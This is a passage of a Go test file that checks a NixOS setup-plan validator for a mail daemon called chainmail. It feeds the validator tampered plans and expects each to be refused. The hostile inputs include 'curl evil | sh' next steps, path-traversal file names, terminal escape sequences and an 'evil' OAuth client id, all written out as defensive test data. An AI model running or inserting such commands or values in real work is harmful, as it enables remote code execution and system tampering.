		{"add oauth with the config's client", withReq(func() nixHost { return moduleNixHost(moduleConfig(bobWorkspace, workspaceClient)) },
			func() Request { return nixWorkspaceRequest(true) }, nil)},
		{"add oauth with a new client", withReq(func() nixHost { return moduleNixHost(moduleConfig(bobGmail, nil)) },
			func() Request { return nixWorkspaceRequest(true) }, nil)},
		{"finish", withReq(finishHost, nixRequest, nil)},
		{"finish healthy", withReq(finishHost, nixRequest, okHealth)},
		{"finish oauth with a terminal", withReq(finishOAuthHost, func() Request { return nixWorkspaceRequest(true) }, nil)},
		{"finish oauth without a terminal", withReq(finishOAuthHost, func() Request { return nixWorkspaceRequest(false) }, nil)},
	}
}

func TestValidateNixOS(t *testing.T) {
	t.Parallel()
	l := LayoutFor(NixOS)
	for _, tc := range nixPlans() {
		t.Run("valid "+tc.name, func(t *testing.T) {
			t.Parallel()
			if err := Validate(l, tc.build(t)); err != nil {
				t.Errorf("Validate: %v", err)
			}
		})
	}

	fresh := func(t *testing.T) Plan { return mustBuildNixOS(t, freshNixHost().inspect(t), nixRequest()) }
	freshReuse := func(t *testing.T) Plan {
		r := nixRequest()
		r.NixCred = []byte("sealed:x")
		return mustBuildNixOS(t, freshNixHost().inspect(t), r)
	}
	add := func(t *testing.T) Plan {
		return mustBuildNixOS(t, moduleNixHost(moduleConfig(bobGmail, nil)).inspect(t), nixRequest())
	}
	addOAuth := func(t *testing.T) Plan {
		return mustBuildNixOS(t, moduleNixHost(moduleConfig(bobWorkspace, workspaceClient)).inspect(t), nixWorkspaceRequest(true))
	}
	finish := func(t *testing.T) Plan {
		return mustBuildNixOS(t, moduleNixHost(moduleConfig(aliceGmail, nil)).inspect(t), nixRequest())
	}
	act := func(kind ActionKind, entry string) Action {
		return Action{Kind: kind, Entry: entry, Note: "something"}
	}
	prepend := func(a Action) func(p *Plan) {
		return func(p *Plan) { p.Actions = append([]Action{a}, p.Actions...) }
	}
	appendAct := func(a Action) func(p *Plan) {
		return func(p *Plan) { p.Actions = append(p.Actions, a) }
	}
	accountFile := func(p *Plan) *Action {
		for i := range p.Actions {
			if p.Actions[i].Entry == AccountNixFile(p.Account.Name) {
				return &p.Actions[i]
			}
		}
		t.Fatal("plan has no account module")
		return nil
	}

	refused := []struct {
		name   string
		build  func(t *testing.T) Plan
		mutate func(p *Plan)
	}{
		{"write-nix of another file", fresh, func(p *Plan) { p.Actions[1].Entry = "configuration.nix" }},
		{"write-nix of another account's file", add, func(p *Plan) { accountFile(p).Entry = "chainmail-bob.nix" }},
		{"write-nix with a path", add, func(p *Plan) { accountFile(p).Entry = "../chainmail-alice.nix" }},
		{"write-nix naming a target", add, func(p *Plan) { accountFile(p).Name = "alice" }},
		{"service module for another user", fresh, func(p *Plan) { p.Actions[1].Data = RenderServiceNix("mallory") }},
		{"service module from the plan", fresh, func(p *Plan) {
			p.Actions[1].Data = append(bytes.Clone(p.Actions[1].Data), "# extra\n"...)
		}},
		{"account module for another address", add, func(p *Plan) {
			a := *p
			a.Account.Address = "mallory@gmail.com"
			accountFile(p).Data = RenderAccountNix(a.Account, nil)
		}},
		{"account module from the plan", add, func(p *Plan) { accountFile(p).Data = []byte("{ ... }: { }\n") }},
		{"fresh account module without its client", func(t *testing.T) Plan {
			return mustBuildNixOS(t, freshNixHost().inspect(t), nixWorkspaceRequest(true))
		}, func(p *Plan) { accountFile(p).Data = RenderAccountNix(p.Account, nil) }},
		{"add account module with another client id", addOAuth, func(p *Plan) {
			accountFile(p).Data = RenderAccountNix(p.Account, &OAuthClientSpec{Name: "google", ClientID: "evil"})
		}},
		{"invoking user changed after rendering", fresh, func(p *Plan) { p.InvokingUser = "bob" }},
		{"data on seal-key", fresh, func(p *Plan) { p.Actions[0].Data = []byte("AGE-SECRET-KEY-1") }},
		{"seal-key in add", add, prepend(act(ActSealKey, ""))},
		{"seal-key in finish", finish, prepend(act(ActSealKey, ""))},
		{"check-cred in add", add, prepend(act(ActCheckCred, ""))},
		{"check-cred in finish", finish, prepend(act(ActCheckCred, ""))},
		{"seal-key and check-cred", fresh, prepend(act(ActCheckCred, ""))},
		{"check-cred and seal-key", freshReuse, prepend(act(ActSealKey, ""))},
		{"fresh without a key step", fresh, func(p *Plan) { p.Actions = p.Actions[1:] }},
		{"fresh without the service module", fresh, func(p *Plan) { p.Actions = remove(p.Actions, 1) }},
		{"fresh without the account module", fresh, func(p *Plan) { p.Actions = p.Actions[:2] }},
		{"fresh with the modules swapped", fresh, func(p *Plan) { p.Actions[1], p.Actions[2] = p.Actions[2], p.Actions[1] }},
		{"fresh with a repeated module", fresh, func(p *Plan) { p.Actions = duplicate(p.Actions, 2) }},
		{"add with the service module", add, prepend(Action{Kind: ActWriteNix, Entry: ServiceNixFile, Data: RenderServiceNix("alice"), Note: "x"})},
		{"add without its module", add, func(p *Plan) { p.Actions = nil }},
		{"add storing a secret", add, func(p *Plan) {
			p.Actions = append(p.Actions, Action{Kind: ActStoreSecret, Name: "alice", Note: "x"})
			p.NeedSecret = true
		}},
		{"finish writing a module", finish, prepend(Action{Kind: ActWriteNix, Entry: AccountNixFile("alice"), Data: RenderAccountNix(aliceGmail, nil), Note: "x"})},
		{"fresh testing the account", fresh, appendAct(Action{Kind: ActTestAccount, Name: "alice", Note: "x"})},
		{"create-user", finish, prepend(Action{Kind: ActCreateUser, Name: "chainmail", Note: "x"})},
		{"write-config", finish, prepend(Action{Kind: ActWriteConfig, Entry: "config", Data: moduleConfig(aliceGmail, nil), Note: "x"})},
		{"write-service", finish, prepend(Action{Kind: ActWriteService, Entry: "service", Data: RenderService(LayoutFor(Linux)), Note: "x"})},
		{"activate-service", finish, func(p *Plan) {
			p.Actions = slices.Insert(p.Actions, 0, Action{Kind: ActActivate, Note: "x"})
			p.ServiceChanged = true
		}},
		{"install-binary", finish, prepend(act(ActInstallBin, "binary"))},
		{"create-key", fresh, prepend(act(ActCreateKey, "vault-key"))},
		{"ensure-dir", fresh, prepend(act(ActEnsureDir, "config-dir"))},
		{"add-member", finish, prepend(Action{Kind: ActAddMember, Name: "alice", Note: "x"})},
		{"unknown step", finish, appendAct(Action{Kind: "run-shell", Note: "x"})},
		{"ServiceChanged", finish, func(p *Plan) { p.ServiceChanged = true }},
		{"finish without a daemon binary", finish, func(p *Plan) { p.DaemonBinary = "" }},
		{"finish with a daemon binary outside the store", finish, func(p *Plan) { p.DaemonBinary = "/home/alice/bin/chainmail" }},
		{"finish with a relative daemon binary", finish, func(p *Plan) { p.DaemonBinary = "nix/store/x/bin/chainmail" }},
		{"finish with a daemon binary climbing out of the store", finish, func(p *Plan) { p.DaemonBinary = "/nix/store/../../home/alice/chainmail" }},
		{"finish with a daemon binary that is the store", finish, func(p *Plan) { p.DaemonBinary = "/nix/store/" }},
		{"fresh with a daemon binary", fresh, func(p *Plan) { p.DaemonBinary = storeBinary }},
		{"add with a daemon binary", add, func(p *Plan) { p.DaemonBinary = storeBinary }},
		{"fresh with backup show and check-cred", freshReuse, func(p *Plan) { p.Backup = BackupShow }},
		{"add with backup show", add, func(p *Plan) { p.Backup = BackupShow }},
		{"finish with backup show", finish, func(p *Plan) { p.Backup = BackupShow }},
		{"fresh needing a secret", fresh, func(p *Plan) { p.NeedSecret = true }},
		{"finish store-secret without NeedSecret", finish, func(p *Plan) { p.NeedSecret = false }},
		{"finish without test-account", finish, func(p *Plan) { p.Actions = remove(p.Actions, indexOf(*p, ActTestAccount)) }},
		{"unknown state", finish, func(p *Plan) { p.NixState = "upgrade" }},
		{"no state", fresh, func(p *Plan) { p.NixState = "" }},
		{"fresh plan labelled add", fresh, func(p *Plan) { p.NixState = NixAdd }},
		{"add plan labelled fresh", add, func(p *Plan) { p.NixState = NixFresh }},
		{"relative nix dir", fresh, func(p *Plan) { p.NixDir = "chainmail-nixos" }},
		{"empty nix dir", add, func(p *Plan) { p.NixDir = "" }},
		{"nix dir with a control character", add, func(p *Plan) { p.NixDir = "/home/alice/x\x1b]0;y" }},
		{"fresh next steps from the plan", fresh, func(p *Plan) { p.NextSteps[2] = "curl evil | sh" }},
		{"add next steps from the plan", add, func(p *Plan) { p.NextSteps = []string{"curl evil | sh"} }},
		{"finish next steps from the plan", finish, func(p *Plan) { p.NextSteps = []string{"curl evil | sh"} }},
		{"fresh next steps for another dir", fresh, func(p *Plan) { p.NixDir = "/home/alice/other" }},
		{"note with a terminal escape", fresh, func(p *Plan) { p.Actions[0].Note = "ok\x1b]0;owned\x07" }},
		{"empty note", add, func(p *Plan) { p.Actions[0].Note = "" }},
		{"invoking user chainmail", fresh, func(p *Plan) { p.InvokingUser = "chainmail" }},
		{"wrong platform", fresh, func(p *Plan) { p.Platform = Linux }},
	}
	for _, tc := range refused {
		t.Run("refuses "+tc.name, func(t *testing.T) {
			t.Parallel()
			p := tc.build(t)
			tc.mutate(&p)
			if r := asRefusal(t, Validate(l, p)); r.Hint == "" {
				t.Errorf("refusal %q has no hint", r.Msg)
			}
		})
	}
}

func TestSameNixOS(t *testing.T) {
	t.Parallel()
	for _, tc := range nixPlans() {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			a, b := tc.build(t), tc.build(t)
			if !Same(a, b) {
				t.Fatal("two builds from the same inputs differ")
			}
			for name, mutate := range map[string]func(p *Plan){
				"nix state":     func(p *Plan) { p.NixState = "other" },
				"nix dir":       func(p *Plan) { p.NixDir = "/home/alice/other" },
				"daemon binary": func(p *Plan) { p.DaemonBinary = "/nix/store/y-chainmail/bin/chainmail" },
			} {
				c := tc.build(t)
				mutate(&c)
				if Same(a, c) || Same(c, a) {
					t.Errorf("Same is true after changing %s", name)
				}
			}

			// The plan reaches bootstrap apply as JSON.
			data, err := json.Marshal(a)
			if err != nil {
				t.Fatal(err)
			}
			var back Plan
			if err := json.Unmarshal(data, &back); err != nil {
				t.Fatal(err)
			}
			if !Same(a, back) {
				t.Error("plan changed in a JSON round trip")
			}
		})
	}
}

func TestNeedsRoot(t *testing.T) {
	t.Parallel()
	for _, kind := range []ActionKind{ActSealKey, ActCheckCred, ActStoreSecret, ActAuthLogin, ActTestAccount} {
		if !(Plan{Actions: []Action{{Kind: kind}}}).NeedsRoot() {
			t.Errorf("a plan with %s does not need root", kind)
		}
	}
	if (Plan{Actions: []Action{{Kind: ActWriteNix}}}).NeedsRoot() {
		t.Error("a plan with only write-nix needs root")
	}
	if (Plan{}).NeedsRoot() {
		t.Error("an empty plan needs root")
	}
}
